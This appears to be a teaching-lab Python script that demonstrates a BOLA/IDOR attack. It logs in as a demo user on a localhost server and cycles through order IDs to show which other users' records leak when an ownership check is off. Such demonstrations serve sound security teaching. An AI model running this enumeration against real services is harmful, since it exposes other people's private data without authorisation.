"""
BOLA / IDOR Attack — "The Number Guesser"
==========================================
Logs in as alice (owns orders 1-5), then cycles through order IDs 1-12.
Without an ownership check the server returns records belonging to bob and charlie.

Run against VULNERABLE server:  SECURE_MODE=false  → attack succeeds
Run against SECURED   server:   SECURE_MODE=true   → all unauthorised IDs return 404
"""
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

import requests
from colorama import Fore, Style, init

init(autoreset=True)

BASE = "http://localhost:5050"
ALICE_CREDS = {"username": "alice", "password": "password123"}
ALICE_USER_ID = 1  # alice owns order IDs 1-5


def login(creds: dict) -> str:
    r = requests.post(f"{BASE}/api/auth/login", json=creds, timeout=5)
    r.raise_for_status()
    return r.json()["token"]


def run_attack(label: str, token: str):
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"  BOLA / IDOR ATTACK  [{label}]")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"Logged in as: {ALICE_CREDS['username']} (user_id={ALICE_USER_ID})")
    print(f"Cycling through order IDs 1 → 12 ...\n")

    headers = {"Authorization": f"Bearer {token}"}
    unauthorised = []

    for order_id in range(1, 13):
        r = requests.get(f"{BASE}/api/orders/{order_id}", headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            owned = data.get("user_id") == ALICE_USER_ID or "user_id" not in data
            if owned:
                print(f"  Order {order_id:2d}  {Fore.GREEN}200 OK{Style.RESET_ALL}  [MINE]    item={data.get('item_name')}")
            else:
                unauthorised.append(data)
                print(f"  Order {order_id:2d}  {Fore.RED}200 OK{Style.RESET_ALL}  [NOT MINE] "
                      f"user_id={data.get('user_id')}  item={data.get('item_name')}  amount={data.get('amount')}")
        elif r.status_code == 404:
            print(f"  Order {order_id:2d}  {Fore.GREEN}404 Blocked{Style.RESET_ALL}")
        else:
            print(f"  Order {order_id:2d}  {r.status_code}")

    print()
    if unauthorised:
        print(f"{Fore.RED}[RESULT] ATTACK SUCCEEDED — "
              f"accessed {len(unauthorised)} unauthorised records belonging to other users!{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[RESULT] ATTACK BLOCKED — "
              f"0 unauthorised records accessed. Ownership check works!{Style.RESET_ALL}")


if __name__ == "__main__":
    token = login(ALICE_CREDS)
    run_attack("live server", token)
